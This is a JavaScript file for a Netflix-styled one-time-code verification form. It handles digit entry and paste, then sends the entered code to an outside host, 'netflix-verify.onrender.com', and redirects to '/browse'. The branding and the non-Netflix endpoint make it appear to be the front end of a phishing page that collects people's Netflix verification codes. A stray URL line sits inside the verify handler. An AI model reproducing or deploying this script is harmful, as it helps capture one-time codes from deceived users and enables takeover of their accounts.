const inputs = document.querySelectorAll('.otp-inputs input');
const errorMsg = document.getElementById('error-msg');

// 1. Handle Input Behavior (Auto-focus next, backspace)
inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
        if (e.target.value !== "" && index < inputs.length - 1) inputs[index + 1].focus();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && !e.target.value && index > 0) inputs[index - 1].focus();
    });

    input.addEventListener('paste', (e) => {
        const data = e.clipboardData.getData('text').slice(0, 6);
        if (data.length === 6 && /^\d+$/.test(data)) {
            data.split('').forEach((char, i) => inputs[i].value = char);
            inputs[5].focus();
        }
    });
});

// 2. Verification Functionality
document.getElementById('verify-btn').onclick = async () => {
    const code = Array.from(inputs).map(i => i.value).join('');
    if (code.length < 6) {
        showError("Please enter all 6 digits.");
        return;
    }

http://localhost:3000/verify
    // Replace with your actual backend URL
    const response = await fetch('https://netflix-verify.onrender.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp: code })
    });

    const result = await response.json();
    if (result.success) {
        alert("Success! Accessing Netflix...");
        window.location.href = "/browse";
    } else {
        showError("Incorrect code. Please try again.");
    }
};

function showError(msg) {
    errorMsg.innerText = msg;
    errorMsg.style.display = "block";
    inputs.forEach(i => i.style.borderBottom = "3px solid #e87c03");
}
